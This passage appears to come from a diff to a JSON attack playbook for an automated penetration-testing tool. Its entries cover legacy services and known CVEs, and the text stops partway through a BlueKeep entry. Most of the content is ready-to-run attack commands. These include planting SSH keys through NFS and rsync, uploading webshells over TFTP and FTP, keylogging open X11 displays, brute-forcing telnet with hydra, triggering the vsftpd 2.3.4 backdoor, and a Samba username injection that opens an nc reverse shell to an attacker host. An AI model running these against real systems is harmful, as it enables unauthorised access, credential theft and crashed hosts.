+      "hypothesis": "A world-readable or writable NFS export is a foothold, not just loot. Mount it: if it holds a user's home you can read an SSH private key or plant an authorized_keys (match your local UID to the owner so the server trusts the write), then SSH in. A writable web root takes a shell the same way.",
+      "tool": "mount",
+      "tools": [
+        "mount",
+        "showmount",
+        "ssh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:2049",
+        "nfs.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 58,
+      "proves": "a shell from a reachable NFS export \u2014 a looted or planted SSH key, or a webshell on a writable share",
+      "does_not_prove": "a shell when exports are squashed and hold nothing sensitive; no_root_squash is the stronger, separate privesc",
+      "report": {
+        "finding": "Sensitive/Writable NFS Export",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting"
+      ],
+      "commands": [
+        {
+          "tool": "showmount",
+          "run": "showmount -e {{target}}",
+          "note": "List the exports and who they are shared with. An export open to everyone (*) is the lead."
+        },
+        {
+          "tool": "mount",
+          "run": "sudo mount -t nfs {{target}}:{{export}} /mnt/nfs -o nolock",
+          "note": "Mount it. Read a home for an id_rsa to SSH in with, or (matching the owner's UID locally) write ~/.ssh/authorized_keys and then SSH: ssh -i key <user>@{{target}}; `id` confirms the foothold."
+        }
+      ]
+    },
+    {
+      "id": "recon-telnet",
+      "title": "Telnet Enumeration",
+      "phase": "recon",
+      "hypothesis": "Telnet is a cleartext remote login with no transport security. The banner frequently names the OS, device model, or hostname; default and reused passwords log straight in; and because nothing is encrypted, a password you send (or one already on the wire) is readable to anyone on-path. Grab the banner and test the obvious credentials before moving on.",
+      "tool": "telnet",
+      "tools": [
+        "telnet",
+        "nmap",
+        "hydra"
+      ],
+      "requires_any": [
+        "port:23"
+      ],
+      "produces": [],
+      "priority": 50,
+      "autonomy": "manual",
+      "proves": "a reachable cleartext login service and whatever its banner discloses",
+      "does_not_prove": "a valid credential or a shell, a banner is a lead and the login still has to succeed",
+      "report": {
+        "finding": "Cleartext Telnet service exposed",
+        "severity": "low"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -sV -p23 --script telnet-ntlm-info {{target}}",
+          "note": "Grab the banner; on a Windows telnet the NTLM script leaks the hostname and domain for free."
+        },
+        {
+          "tool": "telnet",
+          "run": "telnet {{target}} 23",
+          "note": "Connect and read the banner, then try default/weak credentials by hand (admin/admin, root with a blank or reused password)."
+        },
+        {
+          "tool": "hydra",
+          "run": "hydra -L users.txt -P passwords.txt telnet://{{target}}",
+          "note": "Brute a known user list once the banner suggests the service is worth it; telnet locks out rarely."
+        }
+      ]
+    },
+    {
+      "id": "telnet-login",
+      "title": "Log In Over Telnet",
+      "hypothesis": "Telnet is a cleartext login shell - the moment you have a username and password (from the banner, a spray, or a reused credential), logging in IS the foothold. Default and reused passwords are the norm on the devices that still run it. Confirm the login with id/hostname so obol records the shell.",
+      "tool": "telnet",
+      "tools": [
+        "telnet",
+        "hydra"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:23",
+        "telnet.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 60,
+      "proves": "an interactive login shell on the target over telnet \u2014 a foothold",
+      "does_not_prove": "privilege beyond that account; escalate from the shell for the root flag",
+      "report": {
+        "finding": "Cleartext Telnet Login",
+        "severity": "high"
+      },
+      "commands": [
+        {
+          "tool": "telnet",
+          "run": "telnet {{target}} 23",
+          "note": "Log in with the credential you have (banner default, a spray hit, or a reused password). Once in, run `id; hostname; ip -4 addr` so the shell and host identity are captured together."
+        },
+        {
+          "tool": "hydra",
+          "run": "hydra -L {{userlist}} -P {{wordlist}} telnet://{{target}}",
+          "note": "No credential yet? Brute it \u2014 telnet boxes lean on weak/default logins. A [23][telnet] host: ... login: ... password: ... line is your way in; then use the first command."
+        }
+      ]
+    },
+    {
+      "id": "recon-rservices",
+      "title": "BSD r-services (rexec/rlogin/rsh) Trust Abuse",
+      "phase": "recon",
+      "hypothesis": "The Berkeley r-services on 512 (rexec), 513 (rlogin), and 514 (rsh) authenticate by host trust, not by password. A permissive .rhosts or /etc/hosts.equiv (a line of `+ +`, or your box listed as trusted) lets you rlogin or rsh as any user, root included, with no credential at all. When these ports are open, test the trust before anything else.",
+      "tool": "rlogin",
+      "tools": [
+        "rlogin",
+        "rsh",
+        "rwho",
+        "nmap"
+      ],
+      "requires_any": [
+        "port:512",
+        "port:513",
+        "port:514"
+      ],
+      "produces": [],
+      "priority": 50,
+      "autonomy": "manual",
+      "proves": "whether the host trusts your connection for a password-free login",
+      "does_not_prove": "a credential, the access is trust-based and vanishes the moment the trust is tightened",
+      "report": {
+        "finding": "Berkeley r-services trust exposure",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rlogin"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -sV -p512,513,514 {{target}}",
+          "note": "Confirm which r-services answer; rexec/rlogin/rsh often appear together on legacy Unix."
+        },
+        {
+          "tool": "rlogin",
+          "run": "rlogin -l root {{target}}",
+          "note": "Attempt a password-free rlogin as root; needs the rsh-client package (provides rlogin/rsh) on your box."
+        },
+        {
+          "tool": "rsh",
+          "run": "rsh -l root {{target}} id",
+          "note": "Run one command over rsh: if a trust entry covers you, this returns uid=0 with no password prompt."
+        }
+      ]
+    },
+    {
+      "id": "rservices-login",
+      "title": "Log In via r-services (rlogin/rsh)",
+      "hypothesis": "The Berkeley r-services trust logins outright: a permissive ~/.rhosts or /etc/hosts.equiv lets you rlogin or rsh in as a named user - root included - with NO password at all. When recon showed 512/513/514 open, try the trusted-login path; it is frequently a direct root shell.",
+      "tool": "rlogin",
+      "tools": [
+        "rlogin",
+        "rsh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:512",
+        "port:513",
+        "port:514",
+        "rservices.reachable"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.admin"
+      ],
+      "priority": 60,
+      "proves": "a trusted-login shell over rlogin/rsh \u2014 a foothold, and root directly when the trust names root",
+      "does_not_prove": "a shell when no .rhosts trust exists for your source; then fall back to a credential login",
+      "report": {
+        "finding": "Passwordless r-services Trust Login",
+        "severity": "critical"
+      },
+      "commands": [
+        {
+          "tool": "rlogin",
+          "run": "rlogin -l root {{target}}",
+          "note": "If a .rhosts trusts your host you land a root shell with no password. Try -l <user> for each enumerated user too. Run `id; hostname` to capture it."
+        },
+        {
+          "tool": "rsh",
+          "run": "rsh {{target}} -l root id",
+          "note": "The rsh form runs a single command across the trust; `uid=0(root)` confirms a passwordless root foothold."
+        }
+      ]
+    },
+    {
+      "id": "recon-rsync",
+      "title": "rsync Module Enumeration",
+      "phase": "recon",
+      "hypothesis": "An rsync daemon on 873 serves named modules (share points). Many are listable and readable without authentication, and some are writable. Listing the modules, then syncing one down, routinely yields source, backups, configs, and credentials; a writable module that maps onto a sensitive path (a home directory, a web root, authorized_keys) is a direct route to a foothold.",
+      "tool": "rsync",
+      "tools": [
+        "rsync",
+        "nmap"
+      ],
+      "requires_any": [
+        "port:873"
+      ],
+      "produces": [
+        "loot.files"
+      ],
+      "priority": 58,
+      "autonomy": "auto",
+      "sequence": true,
+      "proves": "the rsync modules on offer and any files an anonymous sync can read",
+      "does_not_prove": "write access or a shell, a readable module is loot until you confirm you can also write",
+      "report": {
+        "finding": "Unauthenticated rsync module access",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync"
+      ],
+      "commands": [
+        {
+          "tool": "rsync",
+          "run": "rsync --list-only rsync://{{target}}/",
+          "note": "List the daemon's modules; each line is a share you may be able to read or write."
+        },
+        {
+          "tool": "rsync",
+          "run": "rsync --list-only rsync://{{target}}/{{module}}/",
+          "note": "List the files inside a module before you pull it, so you know what you are taking."
+        },
+        {
+          "tool": "rsync",
+          "run": "rsync -av rsync://{{target}}/{{module}}/ loot/rsync-{{module}}/",
+          "note": "Pull the module down to your loot directory, then grep it for secrets."
+        }
+      ]
+    },
+    {
+      "id": "rsync-write-shell",
+      "title": "Rsync Writable Module to Shell",
+      "hypothesis": "An rsync module you can write to is a foothold when it maps onto a sensitive path. If it covers a home directory, push an authorized_keys and SSH in; if it covers a web root, push a webshell. List the modules, find the writable one, and write your way to a shell.",
+      "tool": "rsync",
+      "tools": [
+        "rsync",
+        "ssh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:873",
+        "rsync.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 58,
+      "proves": "code execution from a writable rsync module \u2014 a foothold via a planted key or webshell",
+      "does_not_prove": "a shell when every module is read-only or sandboxed away from a useful path",
+      "report": {
+        "finding": "Writable rsync Module",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync"
+      ],
+      "commands": [
+        {
+          "tool": "rsync",
+          "run": "rsync rsync://{{target}}/",
+          "note": "List the modules. A module marked writable (or one you can push a test file to) is the lead."
+        },
+        {
+          "tool": "rsync",
+          "run": "rsync -av ./authorized_keys rsync://{{target}}/{{module}}/.ssh/authorized_keys",
+          "note": "When the module maps onto a home directory, plant your public key. Then SSH in: ssh -i key <user>@{{target}}, and run `id; hostname` to capture the foothold."
+        },
+        {
+          "tool": "ssh",
+          "run": "ssh -i {{keyfile}} {{user}}@{{target}} id",
+          "note": "Confirm the planted-key login lands a shell; `uid=...` is your foothold."
+        }
+      ]
+    },
+    {
+      "id": "recon-tftp",
+      "title": "TFTP File Retrieval",
+      "phase": "recon",
+      "hypothesis": "TFTP on UDP/69 is a tiny, unauthenticated file service with no directory listing: you can only fetch (or push) files you can name. It is common on routers, VoIP phones, and PXE/boot setups, where it hands out configuration files that carry hashes, SNMP strings, and management passwords. Guess the well-known names for the device in front of you and read them.",
+      "tool": "tftp",
+      "tools": [
+        "tftp",
+        "nmap"
+      ],
+      "requires_any": [
+        "port:69"
+      ],
+      "produces": [
+        "loot.files"
+      ],
+      "priority": 48,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "any file whose name you can guess on an unauthenticated TFTP server",
+      "does_not_prove": "a full file inventory, TFTP cannot list, so a failed fetch only means that name was wrong",
+      "report": {
+        "finding": "Unauthenticated TFTP service",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -sU -p69 --script tftp-enum {{target}}",
+          "note": "Probe a built-in list of common filenames so you are not guessing entirely blind."
+        },
+        {
+          "tool": "tftp",
+          "run": "tftp {{target}}",
+          "note": "Interactive session: set the mode, then `get <file>` for device configs (e.g. running-config, startup-config, phone cfg files)."
+        }
+      ]
+    },
+    {
+      "id": "tftp-write-shell",
+      "title": "TFTP Write to Shell",
+      "hypothesis": "TFTP has no auth and, when its root sits on a writable, executable path, you can PUT a file that runs. If the TFTP directory is the web root, upload a webshell and request it; if it maps onto a cron or startup path, drop a job. An unauthenticated write that lands in the right place is a foothold.",
+      "tool": "tftp",
+      "tools": [
+        "tftp",
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:69",
+        "tftp.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 50,
+      "proves": "code execution from an unauthenticated TFTP write that landed in an executable path",
+      "does_not_prove": "a shell when the TFTP root is isolated from any served/executed location",
+      "report": {
+        "finding": "Unauthenticated TFTP Write",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp"
+      ],
+      "commands": [
+        {
+          "tool": "tftp",
+          "run": "tftp {{target}} -c put shell.php",
+          "note": "PUT a webshell (match the stack's language). TFTP is silent on success, so verify by requesting it next."
+        },
+        {
+          "tool": "curl",
+          "run": "curl \"http://{{target}}/shell.php?c=id\"",
+          "note": "If the TFTP root was the web root, your file is now served: run a command. `uid=...` is the foothold; swap in a reverse shell and catch it with the listener card."
+        }
+      ]
+    },
+    {
+      "id": "recon-x11",
+      "title": "X11 Open Display Abuse",
+      "phase": "recon",
+      "hypothesis": "An X server listening on 6000+ with access control disabled lets any client on the network draw to, read from, and send input to the user's desktop. With no cookie required you can screenshot the session, log keystrokes (passwords as they are typed), and push windows, all as the logged-in user. It is a direct path from a network port to that user's secrets.",
+      "tool": "xwd",
+      "tools": [
+        "xwd",
+        "xdotool",
+        "nmap"
+      ],
+      "requires_any": [
+        "port:6000"
+      ],
+      "produces": [
+        "loot.material"
+      ],
+      "priority": 46,
+      "autonomy": "manual",
+      "proves": "an X display open to unauthenticated clients and whatever is on that screen",
+      "does_not_prove": "a shell on the host, you are driving the display, not executing code, until you leverage it",
+      "report": {
+        "finding": "Unauthenticated X11 display",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p6000 --script x11-access {{target}}",
+          "note": "Confirm the display accepts clients: the script reports whether access control is disabled."
+        },
+        {
+          "tool": "xwd",
+          "run": "xwd -root -display {{target}}:0 -out screen.xwd && convert screen.xwd screen.png",
+          "note": "Capture the whole desktop; convert (ImageMagick) turns the dump into a viewable PNG."
+        },
+        {
+          "tool": "xdotool",
+          "run": "DISPLAY={{target}}:0 xdotool getwindowfocus getwindowname",
+          "note": "Read the focused window (xdotool reads the X server from DISPLAY, not a flag); from here key-logging and input injection follow."
+        }
+      ]
+    },
+    {
+      "id": "x11-keylog",
+      "title": "X11 Keylog / Screen Capture to Credentials",
+      "hypothesis": "An open X11 display (access control off) is a window onto the logged-in user's session: snapshot the screen for secrets on show, and log keystrokes to catch passwords as they are typed - including the sudo password. Those captured credentials are your way to a shell and to root, so X11 is a credential oracle, not just a curiosity.",
+      "tool": "xwd",
+      "tools": [
+        "xwd",
+        "xdotool"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:6000",
+        "x11.reachable"
+      ],
+      "produces": [
+        "credential.candidate"
+      ],
+      "priority": 50,
+      "proves": "secrets visible on the victim's desktop and keystrokes it typed \u2014 candidate credentials",
+      "does_not_prove": "a shell by itself; the captured password still has to be used on SSH/su/sudo",
+      "report": {
+        "finding": "Unauthenticated X11 Session Access",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11"
+      ],
+      "commands": [
+        {
+          "tool": "xwd",
+          "run": "xwd -root -display {{target}}:0 -out screen.xwd && convert screen.xwd screen.png",
+          "note": "Grab the current screen \u2014 terminals, password managers and chat windows routinely show secrets. Eyeball screen.png."
+        },
+        {
+          "tool": "xdotool",
+          "run": "xspy {{target}}:0",
+          "note": "Log keystrokes from the session. Watch for the sudo/su password being typed; that single capture is often the whole path to root. Paste what you capture and obol records the candidate credential."
+        }
+      ]
+    },
+    {
+      "id": "ftp-upload-webshell",
+      "title": "FTP Write-to-Webroot Shell",
+      "phase": "foothold",
+      "hypothesis": "When a writable FTP directory is the same directory the web server publishes (the FTP user's home is the web root, a classic misconfiguration), you upload a server-side script over FTP and then request it over HTTP to run it. This turns file-write-only access, which proves nothing on its own, into code execution. Confirm the overlap first by uploading a marker file and fetching it back through the browser.",
+      "tool": "ftp",
+      "tools": [
+        "ftp",
+        "curl"
+      ],
+      "requires_any": [
+        "port:21"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 56,
+      "autonomy": "manual",
+      "proves": "code execution, once an FTP-written file is reachable and runs over HTTP",
+      "does_not_prove": "anything unless FTP write and the web root actually overlap, so prove the overlap before the shell",
+      "report": {
+        "finding": "FTP write access over web root leads to RCE",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -T proof.txt ftp://{{target}}/ --user anonymous:anonymous && curl http://{{target}}/proof.txt",
+          "note": "Prove the overlap: write a marker over FTP, then read it over HTTP. If it comes back, the FTP directory is the web root."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -T shell.php ftp://{{target}}/ --user anonymous:anonymous",
+          "note": "Upload a server-side script (match the language the site runs: .php, .aspx, .jsp)."
+        },
+        {
+          "tool": "curl",
+          "run": "curl \"http://{{target}}/shell.php?c=id\"",
+          "note": "Request the uploaded script to execute it; a returned uid is your proof of RCE."
+        }
+      ]
+    },
+    {
+      "id": "ssh-user-enum",
+      "title": "SSH Username Enumeration (CVE-2018-15473)",
+      "phase": "recon",
+      "hypothesis": "OpenSSH before 7.7 answers a malformed public-key authentication request differently for a valid username than an invalid one, leaking which accounts exist. That converts a blind SSH brute into a targeted one: confirm the banner is pre-7.7, enumerate the real usernames, then spray a likely password only against accounts that exist. It yields no code execution on its own, but the validated user list is the material the next brute or spray needs.",
+      "tool": "metasploit",
+      "tools": [
+        "metasploit",
+        "nmap",
+        "hydra"
+      ],
+      "requires_any": [
+        "port:22",
+        "ssh.reachable"
+      ],
+      "produces": [
+        "ad.user_list"
+      ],
+      "priority": 55,
+      "autonomy": "auto",
+      "sequence": true,
+      "proves": "the SSH version and, on a pre-7.7 server, which usernames are valid",
+      "does_not_prove": "a login, only that an account exists; a 7.7 or newer banner closes this technique",
+      "report": {
+        "finding": "SSH username enumeration (CVE-2018-15473)",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -sV -p22 {{target}}",
+          "note": "Read the OpenSSH version; only releases before 7.7 are vulnerable to this enumeration."
+        },
+        {
+          "tool": "metasploit",
+          "run": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {{target}}; set USER_FILE users.txt; run; exit'",
+          "note": "The module sends the malformed auth and reports each name as found or not found."
+        },
+        {
+          "tool": "hydra",
+          "run": "hydra -L valid_users.txt -p '{{password}}' ssh://{{target}}",
+          "note": "Spray one password across only the validated users, watching the lockout policy."
+        }
+      ],
+      "requires_all": [
+        "scan.nmap.version"
+      ]
+    },
+    {
+      "id": "smtp-open-relay",
+      "title": "SMTP Open-Relay Test",
+      "phase": "recon",
+      "hypothesis": "A mail server that forwards messages for senders and recipients outside the domains it serves is an open relay, a reportable misconfiguration and a lever for phishing or internal spoofing. You confirm it by offering a MAIL FROM and a RCPT TO that are both external and watching for a 250 accept instead of a 550 refusal. It gives no shell, but it is a finding on its own and sometimes sets up a credential-harvesting email to a real user. It is distinct from VRFY and EXPN user enumeration on the same port.",
+      "tool": "nmap",
+      "tools": [
+        "nmap",
+        "swaks",
+        "telnet"
+      ],
+      "requires_any": [
+        "port:25",
+        "port:587",
+        "port:465"
+      ],
+      "produces": [
+        "config.review"
+      ],
+      "priority": 48,
+      "autonomy": "auto",
+      "sequence": true,
+      "proves": "whether the server relays mail for arbitrary external senders and recipients",
+      "does_not_prove": "a credential or a shell; an open relay is a configuration finding, not access",
+      "report": {
+        "finding": "SMTP open relay",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap --script smtp-open-relay -p25 {{target}}",
+          "note": "Runs sixteen relay patterns and reports whether any are accepted."
+        },
+        {
+          "tool": "swaks",
+          "run": "swaks --to external@gmail.com --from spoof@external.net --server {{target}}",
+          "note": "Manual proof: a 250 after RCPT TO an outside address is the relay accepting."
+        },
+        {
+          "tool": "telnet",
+          "run": "telnet {{target}} 25",
+          "note": "By hand: HELO x, MAIL FROM a@external.net, RCPT TO b@gmail.com; a 250 on the recipient confirms it."
+        }
+      ]
+    },
+    {
+      "id": "ftp-bounce",
+      "title": "FTP Bounce Scan (FXP)",
+      "phase": "recon",
+      "hypothesis": "The FTP PORT command lets a client dictate where the server opens its data connection, and an old server that honors an arbitrary address will connect to a third host for you. Aimed at an internal host you cannot reach directly, that becomes a port scan run from the FTP server position. It is niche, but when a bounce-capable FTP server sits in front of a segment you cannot otherwise touch, it is a free internal map. nmap automates it with -b; treat a hit as a pivot lead, not a shell.",
+      "tool": "nmap",
+      "tools": [
+        "nmap",
+        "ftp"
+      ],
+      "requires_any": [
+        "port:21",
+        "ftp.reachable"
+      ],
+      "produces": [
+        "config.review"
+      ],
+      "priority": 44,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "that the FTP server honors the PORT command and which ports answer on an internal host through it",
+      "does_not_prove": "access to the internal host, only a map of its open ports",
+      "report": {
+        "finding": "FTP bounce scanning permitted",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp"
+      ],
+      "commands": [
+        {
+          "tool": "ftp",
+          "run": "ftp {{target}}",
+          "note": "Log in (anonymous is usually enough); you must be authenticated to issue PORT."
+        },
+        {
+          "tool": "ftp",
+          "run": "quote PORT 172,16,5,10,0,21",
+          "note": "Aim a data connection at an internal host; a 200 means the bounce is allowed, a 500 means it is blocked."
+        },
+        {
+          "tool": "nmap",
+          "run": "nmap -b anonymous:anonymous@{{target}} -p 1-1000 172.16.5.10",
+          "note": "Let nmap run the whole bounce scan: -b is the FTP relay, the trailing host is the internal target."
+        }
+      ]
+    },
+    {
+      "id": "vsftpd-backdoor",
+      "title": "vsftpd 2.3.4 Backdoor (CVE-2011-2523)",
+      "hypothesis": "One backdoored release of vsftpd, version 2.3.4, opens a root shell on port 6200 when any username ends in a smiley. Confirm the banner reads vsftpd 2.3.4, send a login whose username ends in ':)', then connect to tcp/6200 for a root shell. Because the trigger is a banner version, not a configuration, this is a reliable instant root when you see it.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "ftp",
+        "nmap"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:21",
+        "vuln.vsftpd_234"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "priority": 42,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a root shell on tcp/6200 when the banner is vsftpd 2.3.4",
+      "does_not_prove": "anything on any other vsftpd version; only 2.3.4 carries the backdoor",
+      "report": {
+        "finding": "Backdoored vsftpd 2.3.4 grants an unauthenticated root shell",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2011-2523"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p21 -sV {{target}}",
+          "note": "Fingerprint first: the backdoor exists only when the banner reads vsftpd 2.3.4."
+        },
+        {
+          "tool": "nc",
+          "run": "(printf 'USER hax:)\\r\\nPASS hax\\r\\n'; sleep 2) | nc {{target}} 21; nc {{target}} 6200",
+          "note": "A username ending in ':)' trips the backdoor; the second connection to 6200 is your root shell. Type id to confirm."
+        },
+        {
+          "tool": "msfconsole",
+          "run": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {{target}}; run\"",
+          "note": "The Metasploit module automates the trigger and the 6200 connect."
+        }
+      ]
+    },
+    {
+      "id": "proftpd-modcopy",
+      "title": "ProFTPD mod_copy Unauthenticated Copy to Webshell (CVE-2015-3306)",
+      "hypothesis": "ProFTPD 1.3.5 exposes SITE CPFR and SITE CPTO with no authentication, so you can copy a file the server can read into a directory the web server serves. Point it at a PHP payload and you have written a webshell into the web root without a single credential. You need to know the web root path, which recon of the HTTP service usually reveals.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "curl",
+        "nmap"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:21",
+        "vuln.proftpd_modcopy"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 42,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "an attacker-written file executing under the web root via unauthenticated SITE CPFR/CPTO",
+      "does_not_prove": "code execution unless the copy target is actually served and executed by the web server",
+      "report": {
+        "finding": "ProFTPD 1.3.5 mod_copy allows unauthenticated file copy into the web root",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2015-3306"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p21 -sV {{target}}",
+          "note": "Confirm the banner reads ProFTPD 1.3.5 before you try the copy."
+        },
+        {
+          "tool": "nc",
+          "run": "nc {{target}} 21",
+          "note": "Then paste: SITE CPFR /etc/passwd then SITE CPTO /tmp/out to prove the copy works before you write a payload."
+        },
+        {
+          "tool": "curl",
+          "run": "curl 'http://{{target}}/shell.php?cmd=id'",
+          "note": "After copying a PHP payload into the web root, call it. Swap id for a reverse-shell one-liner once it responds. Start nc -lvnp 4444 first."
+        }
+      ]
+    },
+    {
+      "id": "samba-usermap",
+      "title": "Samba usermap_script Command Injection (CVE-2007-2447)",
+      "hypothesis": "Old Samba, versions 3.0.20 through 3.0.25rc3, passes the username straight into a shell when the username map script option is set, so a username that contains a shell command runs that command as root. You inject through the username field of an anonymous IPC connection, with a listener waiting, and catch a root shell. No credentials and no file upload are needed.",
+      "tool": "smbclient",
+      "tools": [
+        "smbclient",
+        "nmap"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:445",
+        "port:139",
+        "vuln.samba_usermap"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "priority": 42,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "command execution as root via the Samba username map on 3.0.20 to 3.0.25rc3",
+      "does_not_prove": "anything on a patched Samba or when the username map script option is unset",
+      "report": {
+        "finding": "Samba usermap_script command injection grants an unauthenticated root shell",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2007-2447"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p139,445 --script smb-os-discovery {{target}}",
+          "note": "Confirm the version sits between Samba 3.0.20 and 3.0.25rc3."
+        },
+        {
+          "tool": "smbclient",
+          "run": "smbclient //{{target}}/ipc$ -N -U \"./=`nohup nc {{lhost}} 4444 -e /bin/sh`\"",
+          "note": "The username carries the command; start nc -lvnp 4444 first to catch the root shell."
+        },
+        {
+          "tool": "msfconsole",
+          "run": "msfconsole -q -x \"use exploit/multi/samba/usermap_script; set RHOSTS {{target}}; set LHOST {{lhost}}; run\"",
+          "note": "The Metasploit module is the reliable alternative if the manual injection is awkward."
+        }
+      ]
+    },
+    {
+      "id": "smbghost",
+      "title": "SMBGhost SMBv3 Compression Overflow (CVE-2020-0796)",
+      "hypothesis": "SMBv3.1.1 on Windows 10 1903 and 1909 and Server 2019 mishandles compressed messages, which a crafted packet turns into local or remote code execution as SYSTEM. First confirm the host speaks SMB 3.1.1 with compression, then run the public proof of concept. The remote exploit is unstable and can crash the target, so snapshot the box and prefer it where a crash is acceptable.",
+      "tool": "nmap",
+      "tools": [
+        "nmap",
+        "python"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "port:445",
+        "vuln.smbghost"
+      ],
+      "produces": [
+        "foothold.windows",
+        "access.system"
+      ],
+      "priority": 38,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "SYSTEM on a vulnerable SMBv3.1.1 host when the proof of concept lands",
+      "does_not_prove": "anything unless the host is the exact vulnerable build, and the RCE path can crash it",
+      "report": {
+        "finding": "SMBGhost SMBv3.1.1 compression overflow allows code execution as SYSTEM",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2020-0796"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p445 --script smb-protocols {{target}}",
+          "note": "You need SMB 3.1.1; the build must be Win10 1903/1909 or Server 2019 for the compression bug."
+        },
+        {
+          "tool": "python",
+          "run": "python3 scanner.py {{target}}",
+          "note": "The ollypwn SMBGhost scanner prints Vulnerable or Not vulnerable before you risk the exploit."
+        },
+        {
+          "tool": "python",
+          "run": "python3 SMBGhost_RCE.py -ip {{target}}",
+          "note": "chompie1337's RCE proof of concept; edit the embedded shellcode to call back to {{lhost}}. It can BSOD the host, so snapshot first."
+        }
+      ]
+    },
+    {
+      "id": "bluekeep",
+      "title": "BlueKeep RDP Pre-Auth RCE (CVE-2019-0708)",
+      "hypothesis": "RDP on Windows 7 and Server 2008 R2 has a pre-authentication use-after-free that reaches code execution as SYSTEM with no credentials. Confirm the host is vulnerable with the nmap script, pick the exact target profile the exploit asks for, then run it. The proof of concept is crash-prone, so treat a BSOD as a likely outcome and only fire it where that is acceptable.",
+      "tool": "nmap",
+      "tools": [
+        "nmap",
+        "msfconsole"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "port:3389",
+        "vuln.bluekeep"
+      ],
+      "produces": [
+        "foothold.windows",
+        "access.system"
+      ],
+      "priority": 38,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "SYSTEM on a vulnerable Win7 or Server 2008 R2 RDP host",
+      "does_not_prove": "anything on a patched or non-matching target, and the exploit can crash the host",
+      "report": {
+        "finding": "BlueKeep pre-auth RDP RCE allows code execution as SYSTEM",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2019-0708"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
+          "note": "Confirm VULNERABLE before you go further; the exploit is unsafe to fire blindly."
+        },
+        {
